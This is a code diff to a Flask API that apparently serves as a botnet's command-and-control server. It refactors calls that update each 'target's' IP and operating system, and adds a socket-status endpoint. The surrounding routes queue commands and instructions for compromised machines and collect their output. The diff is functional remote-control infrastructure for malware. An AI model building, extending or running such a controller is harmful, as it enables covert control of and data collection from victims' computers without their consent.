@@ -5,7 +5,7 @@ from datetime import datetime
 from db.modle import APICommand,APILink,ApiToken,Instraction,Targets,BotNet
 from db.mange_db import config,_create_engine
 from utility.email_temp import email_temp
-from utility.processer import log,getlist,readFromJson,update_output,update_user_info,update_target_info
+from utility.processer import log,getlist,readFromJson,update_output,update_user_info,update_target_info,update_socket_info
 
 emailTemplate = email_temp()
 
@@ -35,8 +35,7 @@ def apiCommand(target_name):
                     sp=','
                 )
                 print(apiCommand)
-                if IP != readFromJson()['target-info'][target_name]['ip']:
-                    data = readFromJson()['target-info'][target_name]
+                if IP != readFromJson('target-info',target_name)['ip']:
                     update_target_info(target_name,IP,opreatingSystem)
                 return {'allCommand': apiCommand},200
             
@@ -80,7 +79,7 @@ def save_output():
                     )
                     _session.commit()
 
-                if IP != readFromJson()['target-info'][target_name]['ip']:
+                if IP != readFromJson('target-info',target_name)['ip']:
                     update_target_info(target_name,IP,opreatingSystem)
 
                 return {'message': 'Outputs were seved'},200
@@ -176,11 +175,11 @@ def instarction(target_name):
 
                 instraction = getlist(_session.query(Instraction).filter_by(target_name=target_name, stutas=config.STUTAS[0]).all(), sp=',')
                 if len(instraction) != 0:
-                    if IP != readFromJson()['target-info'][target_name]['ip']:
-                        data = readFromJson()['target-info'][target_name]['ip']
+                    if IP != readFromJson('target-info',target_name)['ip']:
+                        data = readFromJson('target-info',target_name)['ip']
                         print('updatinting ip',data)
                         update_target_info(target_name,IP,opratingSystem)
-                    print('updatinting ip',readFromJson()['target-info'][target_name]['ip'],'ip',IP)
+                    print('updatinting ip',readFromJson('target-info',target_name)['ip'],'ip',IP)
                     return {'delay': instraction[0][1], 'instraction': instraction[0][3]}, 200
                 
                 return {'Message': 'No instraction found'}, 404
@@ -194,3 +193,40 @@ def instarction(target_name):
         return {'Error': "Unsupported method or didn't provid target name"},405
 
 
+@api.route("/api/socket/<target_name>", methods=['GET', 'POST'])
+def socket(target_name=None):
+    """
+    Render the socket page for a given target.
+    Handles token verification if POST data is provided.
+    Redirects to login if the user is not authenticated.
+    """
+    if request.method == "POST":
+        is_connect = request.json.get('is_connect')
+        token = request.json.get('token')
+        
+        check_token = getlist(_session.query(ApiToken).filter_by(user_email=session['email']).all(), sp=',')[0]
+        if token == check_token[1]:
+            targets = getlist(_session.query(Targets).filter_by(target_name=target_name).all(), sp=',')
+            instraction = getlist(_session.query(Instraction).filter_by(target_name=target_name).all(), sp=',')
+            if targets and instraction:
+                _session.query(Instraction).filter_by(
+                    target_name=target_name, instraction=config.INSTRACTION[1]
+                ).update({'stutas': config.STUTAS[0]})
+            _session.commit()
+            update_socket_info(token, is_connect)
+            return {'status': 'status saved'}, 200
+        else:
+            return {'error': 'invalid token'}, 403
+
+    elif request.method == 'GET':
+        if 'email' not in session:
+            return {'error': 'unauthorized'}, 401
+        token = request.args.get('token')
+        try:
+            status = readFromJson('socket-status', token)['status']
+            return {'status': status}, 200
+        except KeyError:
+            return {'status': 'disconnected'}, 200
+
+    # This point should never be reached with defined methods
+    return {'error': 'Unsupported method'}, 405
